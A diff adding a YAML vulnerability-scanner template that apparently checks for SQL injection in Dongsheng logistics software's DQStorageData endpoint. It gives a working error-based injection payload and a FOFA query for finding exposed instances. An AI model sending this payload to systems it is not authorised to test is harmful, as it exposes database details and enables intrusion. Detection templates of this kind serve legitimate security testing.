@@ -1,0 +1,15 @@
+id: poc-yaml-dongshengsoft-dqstoragedata-sqli
+info:
+  name: 东胜物流软件 DQStorageData SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 东胜物流软件
+  fofa: app="东胜物流软件-物流软件"
+requests:
+- method: GET
+  path: /Storage/Storage/DQStorageData?openid=')and+1<@@VERSION--+-&mblno=111&page=1&pageSize=10
+  expression: status_code == 500 && contains(body,"Microsoft SQL Server") && contains(body,"SqlException:")
+    && contains(body,".DQStorageData") && matches(body,"转换成数据类型(.*?)时失败") && matches(body,"在将(.*?)值")
+variables: {}
+transport: http
